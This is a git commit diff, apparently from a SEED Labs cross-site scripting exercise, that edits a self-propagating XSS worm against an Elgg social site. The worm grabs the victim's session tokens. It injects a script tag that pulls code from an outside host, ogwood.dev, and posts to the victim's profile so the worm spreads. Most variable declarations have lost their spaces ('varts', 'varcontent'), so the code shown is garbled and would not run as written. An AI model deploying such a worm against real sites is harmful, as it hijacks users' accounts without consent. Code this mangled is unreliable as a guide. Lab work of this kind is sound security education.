741e1f45800f16278621d3b63030bfed53164a99
Oliver Greenwood <greenwood672.dev@gmail.com>
2025-05-23 16:49:22 +0100

    Update seed2.js

--- public/seed2.js
+++ public/seed2.js
@@ -6,14 +6,14 @@
  varts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  vartoken="&__elgg_token="+elgg.security.token.__elgg_token;
  //Constructthecontentofyoururl.
- varcontent="<script type='text/javascript' src='https://ogwood.dev/seed2.js'></script>"; //FILLIN
+ varcontent="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
  varsamyGuid=59; //FILLIN
  varsendurl="http://www.seed-server.com/profile/" + elgg.session.user.name + varuserName + varguid + varts + vartoken + "&briefdescription=" + varcontent; //FILLIN
  if(elgg.session.user.guid!=varsamyGuid)
  {
  //CreateandsendAjaxrequesttomodifyprofile
  varAjax=null;
- Ajax=newXMLHttpRequest();
+ Ajax=new XMLHttpRequest();
  Ajax.open("POST",sendurl,true);
  Ajax.setRequestHeader("Content-Type",
  "application/x-www-form-urlencoded");
